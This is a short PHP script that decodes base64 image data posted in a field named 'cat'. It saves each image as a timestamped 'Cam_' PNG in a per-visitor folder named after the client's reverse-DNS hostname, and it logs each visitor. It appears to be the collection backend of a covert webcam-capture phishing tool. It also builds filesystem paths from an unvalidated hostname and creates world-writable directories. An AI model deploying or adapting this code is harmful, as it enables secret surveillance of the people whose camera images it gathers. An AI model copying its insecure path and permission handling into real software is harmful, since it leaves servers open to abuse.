<?php
$dirname = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$dirpath = "./upl_mak.2033_oad/" . $dirname . "/";
date_default_timezone_set("Asia/Amman");
if (!file_exists($dirpath)) {
    mkdir("./upl_mak.2033_oad/" . $dirname, 0777, true);
    };
    
if (!empty($_POST['cat'])) {
    error_log("Received from ".$dirname . " at " . date('Y-m-d H:i:s a') . "\r\n", 3, "Log.log");
    
};

$filteredData=substr($_POST['cat'], strpos($_POST['cat'], ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( $dirpath . 'Cam_'.date('Y-m-d_H-i-sa') .'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();
?>

